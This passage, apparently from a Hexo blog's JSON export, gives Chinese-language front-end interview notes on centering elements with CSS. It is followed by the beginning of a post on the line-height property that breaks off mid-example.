href=\"#方法四：Flexbox\" class=\"headerlink\" title=\"方法四：Flexbox\"></a>方法四：Flexbox</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>, <span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">justify-content</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是CSS布局未来的趋势。<br>Flexbox是CSS3新增属性,设计初衷是为了解决像垂直居中这样的常见布局问题。<br>优点：内容块的宽高任意,优雅的溢出。<br>缺点：</p>\n<ol>\n<li>IE8/IE9不支持。</li>\n<li>运行于现代浏览器上的代码需要浏览器厂商前缀。</li>\n<li>需要特定的父容器。</li>\n</ol>\n<h3 id=\"方法五：使文本居中的方法，使用-line-height-属性\"><a href=\"#方法五：使文本居中的方法，使用-line-height-属性\" class=\"headerlink\" title=\"方法五：使文本居中的方法，使用 line-height 属性\"></a>方法五：使文本居中的方法，使用 line-height 属性</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>:gray;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"方法六：使用-before-元素\"><a href=\"#方法六：使用-before-元素\" class=\"headerlink\" title=\"方法六：使用 ::before 元素\"></a>方法六：使用 ::before 元素</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: fixed;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(0, 0, 0, .5);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.parent</span> <span class=\"selector-pseudo\">:before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.parent</span> <span class=\"selector-class\">.child</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: yellow;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"如何水平居中一个元素：\"><a href=\"#如何水平居中一个元素：\" class=\"headerlink\" title=\"如何水平居中一个元素：\"></a>如何水平居中一个元素：</h2><h3 id=\"通用方法，在不知道具体盒子的宽高时\"><a href=\"#通用方法，在不知道具体盒子的宽高时\" class=\"headerlink\" title=\"通用方法，在不知道具体盒子的宽高时\"></a>通用方法，在不知道具体盒子的宽高时</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">     <span class=\"attribute\">left</span>:<span class=\"number\">50%</span>;</span><br><span class=\"line\">     <span class=\"attribute\">transform</span>:<span class=\"built_in\">transformX</span>(-50%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 1：如果需要居中的元素为常规流中 display: inline 即内联元素，为父元素设置 text-align 即可。</p>\n<p>常见的内联标签有：span a img input label br 等</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 2：如果需要居中的元素为常规流中的 block 元素，先为元素设置宽度，再设置属性 margin 为auto。</p>\n<p>常见的块级元素：div h1 ~ h6 table p ul li 等</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div&#123;</span><br><span class=\"line\">    width: 600px;</span><br><span class=\"line\">    height: 50px;    //需要设置 div 高度，否则盒子无法撑起</span><br><span class=\"line\">    margin: 0 auto;</span><br><span class=\"line\">    background: #999;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者：可以先将块级元素转换为 display:inline-block，然后再将其父元素 text-align:center 即可。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>:inline-block;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 3：如果需要居中的元素为浮动元素  </p>\n<ol>\n<li>为元素设置高度和宽度</li>\n<li>position 设为 relative</li>\n<li>left 或者 right 设为 50%</li>\n<li>margin-left 或者 margin-right 设为元素宽度的一半的负值</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">50px</span>;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 4：如果需要居中的元素为绝对定位元素</p>\n<ol>\n<li>为元素设置宽度和宽度</li>\n<li>设置父元素 position 值为 relative</li>\n<li>left 或者 right 设为 50%</li>\n<li>margin-left 或者 margin-right 设为元素宽度的一半的负值</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">500px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">400px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者：</p>\n<ol>\n<li>为元素设置宽度和高度</li>\n<li>设置父元素 position 值为 relative</li>\n<li>设置 left 和 right 值为 0</li>\n<li>设置左右外边距为 auto</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">500px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"如何垂直居中一个元素：\"><a href=\"#如何垂直居中一个元素：\" class=\"headerlink\" title=\"如何垂直居中一个元素：\"></a>如何垂直居中一个元素：</h2><h3 id=\"通用方法：\"><a href=\"#通用方法：\" class=\"headerlink\" title=\"通用方法：\"></a>通用方法：</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">     <span class=\"attribute\">top</span>:<span class=\"number\">50%</span>;</span><br><span class=\"line\">     <span class=\"attribute\">transform</span>:<span class=\"built_in\">transformY</span>(-50%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 1: 需要居中元素为单行文本，为包含文本的元素设置大于font-size的line-height</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.text</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"水平垂直居中的办法\"><a href=\"#水平垂直居中的办法\" class=\"headerlink\" title=\"水平垂直居中的办法\"></a>水平垂直居中的办法</h2><h3 id=\"方法一：绝对居中定位\"><a href=\"#方法一：绝对居中定位\" class=\"headerlink\" title=\"方法一：绝对居中定位\"></a>方法一：绝对居中定位</h3><p>条件: 块元素尺寸已知</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: auto;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：</p>\n<ol>\n<li>不仅可以实现在正中间，还可以在正左方，正右方</li>\n<li>支持百分比%属性值和min-/max-属性</li>\n<li>支持跨浏览器,包括IE8-IE10</li>\n<li>只用这一个类可实现任何内容块居中</li>\n</ol>\n<h3 id=\"方法二：负边距居中\"><a href=\"#方法二：负边距居中\" class=\"headerlink\" title=\"方法二：负边距居中\"></a>方法二：负边距居中</h3><p>条件: 块元素尺寸已知</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：良好的跨浏览器特性,兼容IE6-IE7</p>\n<p>缺点：不能自适应。不支持百分比尺寸和min-/max-属性设置</p>\n<h3 id=\"方法三：变形（Transforms）\"><a href=\"#方法三：变形（Transforms）\" class=\"headerlink\" title=\"方法三：变形（Transforms）\"></a>方法三：变形（Transforms）</h3><p>元素高度可变</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translate</span>(-50%,-50%);</span><br><span class=\"line\">    <span class=\"attribute\">-ms-transform</span>: <span class=\"built_in\">translate</span>(-50%,-50%);</span><br><span class=\"line\">    <span class=\"attribute\">transform</span>: <span class=\"built_in\">translate</span>(-50%, -50%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：内容可变高度</p>\n<p>缺点：</p>\n<ol>\n<li>IE 8 不支持</li>\n<li>属性需要写浏览器厂商前缀</li>\n<li>可能干扰其他transform效果</li>\n</ol>\n<h3 id=\"方法四：Flexbox\"><a href=\"#方法四：Flexbox\" class=\"headerlink\" title=\"方法四：Flexbox\"></a>方法四：Flexbox</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">html</span>, <span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">justify-content</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">align-items</span>: center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是CSS布局未来的趋势。<br>Flexbox是CSS3新增属性,设计初衷是为了解决像垂直居中这样的常见布局问题。<br>优点：内容块的宽高任意,优雅的溢出。<br>缺点：</p>\n<ol>\n<li>IE8/IE9不支持。</li>\n<li>运行于现代浏览器上的代码需要浏览器厂商前缀。</li>\n<li>需要特定的父容器。</li>\n</ol>\n<h3 id=\"方法五：使文本居中的方法，使用-line-height-属性\"><a href=\"#方法五：使文本居中的方法，使用-line-height-属性\" class=\"headerlink\" title=\"方法五：使文本居中的方法，使用 line-height 属性\"></a>方法五：使文本居中的方法，使用 line-height 属性</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>:<span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>:gray;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"方法六：使用-before-元素\"><a href=\"#方法六：使用-before-元素\" class=\"headerlink\" title=\"方法六：使用 ::before 元素\"></a>方法六：使用 ::before 元素</h3><p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: fixed;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(0, 0, 0, .5);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.parent</span> <span class=\"selector-pseudo\">:before</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.parent</span> <span class=\"selector-class\">.child</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">vertical-align</span>: middle;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">60px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: yellow;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"CSS - 深入理解 line-height 属性","date":"2016-03-16T04:00:00.000Z","author":"Lindz","header-img":"img/14.jpg","_content":"\n> 最近看张鑫旭大神博客学习 CSS，发现这个 line-height 属性挺有意思，我理解归纳了下，写了一篇学习笔记。\n\n## 概念\n\nline-height 为行高，即两行文字基线之间的距离，\n\n注：**这里行高是两行文字基线之间的距离，并不是指一行文字就没有行高了，可以这么理解：两行的定义决定了一行文字的表现。**\n\n什么是基线呢？我们来看下面这张图：  \n![](/assets/2016-03-16-css-line-height/1.png)\n\n从图中我们可以得出，从上往下四条线分别叫：顶线，中线，基线，底线。  \n\n**所谓的行高是指上下文本行的基线间的垂直距离，即图中两条红线间的垂直距离。**\n\n## 属性值：\n\n```css\nelem{\n\tline-height: normal | <number> | <length> | <percent> | inherit\n}\n``` \n\n默认值：normal，与浏览器有关，且与元素字体相关\n\nnumber：line-height: 1.5;  \n根据当前元素的 font-size 大小计算\n\n```css\nelem{\n\tfont-size: 20px;\n\tline-height: 1.5;  //此时行高为 20px * 1.5 = 30px\n}\n```\n\nlength：使用具体的长度值作为行高值。例如: line-height: 20px;\n\npercent: 相对于设置了该 line-height 属性的元素的 font-size 大小计算\n\n```css\nelem{\n\tfont-size:20px;\n\tline-height: 150%;  //行高为 30px;\n}\n```\n\ninherit 继承自父元素\n\n### Q1: 行高默认是继承的，为什么还需要 inherit？\n\n行高虽然本身就是继承的，但诸如 input 等框元素默认行高是 normal，使用 inherit 可以让文本框样式可控性更强。\n\n### Q2: 元素属性对行高影响?\n\n行框高度是行内最高的行内框高度，通过 line-height 调整，内容区行高与字体尺寸有关(这个后面会讲到)，padding 不对行高造成影响。\n\n```html\n<div style=\"border:dashed 1px #000;margin-bottom:30px;\">\n    <span style=\"font-size:14px;background-color:#999;\">This is a test</span>\n</div>\n<div style=\"border:dashed 1px #000;\">\n    <span style=\"font-size:14px;padding:20px;background-color:#999;\">This is a test</span>\n</div>\n```\n\n实际效果：  \n![](/assets/2016-03-16-css-line-height/2.png)\n\n可以看出：padding 对行高不起作用。(因为它们的 span 边框高度相同)\n\n### Q3: line-height: 1.5, 150%, 1.5em 各有什么区别？\n\n首先如果你在某元素上设置了行高和字体大小，那么其实是没差的，如：\n\n```css\nelem{\n\tfont-size: 20px;\n\tline-height: 1.5 | 150% | 1.5em;   //这里行高都一样，为 30px\n}\n``` \n\n但是如果应用在元素不同则导致差异:\n\n* line-height: 1.5 所有可继承的元素根据 font-size 重计算行高\n* line-height: 150% / 1.5em 当前元素根据 font-size 计算行高，  然后继承给下面的元素\n\n来看一段例子：\n\n```html\n<p class=\"p1\">\n    <span>我的 font-size 